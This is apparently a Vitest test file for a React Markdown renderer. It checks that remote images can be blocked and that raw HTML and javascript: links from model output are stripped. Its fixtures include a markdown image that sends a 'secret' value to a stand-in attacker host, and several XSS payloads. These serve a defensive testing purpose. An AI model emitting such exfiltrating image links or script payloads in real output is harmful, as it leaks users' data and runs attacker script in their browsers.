import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';

import Markdown from './markdown';

const IMAGE = '![summary](https://attacker.example/c?q=secret)';

describe('Markdown', () => {
    it('renders images by default', () => {
        expect(renderToStaticMarkup(<Markdown>{IMAGE}</Markdown>)).toContain('<img');
    });

    it('turns images into links that do not load when blockRemoteImages is set', () => {
        const html = renderToStaticMarkup(<Markdown blockRemoteImages>{IMAGE}</Markdown>);

        expect(html).not.toContain('<img');
        expect(html).toContain('href="https://attacker.example/c?q=secret"');
        expect(html).toContain('rel="noopener noreferrer nofollow"');
    });

    it('never renders raw HTML or javascript: links from model output', () => {
        const html = renderToStaticMarkup(
            <Markdown blockRemoteImages>
                {'<img src=x onerror=alert(1)> <script>alert(1)</script> [click](javascript:alert(1))'}
            </Markdown>,
        );

        expect(html).not.toContain('<img');
        expect(html).not.toContain('<script');
        expect(html).not.toContain('javascript:');
    });
});
